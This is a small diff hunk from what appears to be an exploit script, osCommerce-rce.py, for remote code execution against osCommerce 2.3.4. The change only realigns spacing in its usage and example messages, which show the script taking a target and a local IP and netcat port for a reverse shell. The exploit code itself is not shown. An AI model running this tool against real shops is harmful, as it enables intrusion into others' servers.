@@ -74,8 +74,8 @@ def exploit(RHOST, RPORT, path, command, timeout):
 
 if __name__ == '__main__':
     if len(sys.argv) != 6:
-        print(Style.BRIGHT + "Usage  : " + Style.NORMAL + "python3 osCommerce-rce.py target_IP target_port target_uri local_ip netcat_port")
-        print(Style.BRIGHT + "Example  : " + Style.NORMAL + "python3 osCommerce-rce.py 10.10.134.254 80 /oscommerce-2.3.4/ 10.8.17.244 9999")
+        print(Style.BRIGHT + "Usage   : " + Style.NORMAL + "python3 osCommerce-rce.py target_IP target_port target_uri local_ip netcat_port")
+        print(Style.BRIGHT + "Example : " + Style.NORMAL + "python3 osCommerce-rce.py 10.10.134.254 80 /oscommerce-2.3.4/ 10.8.17.244 9999")
         sys.exit(1)
     
     RHOST = sys.argv[1]
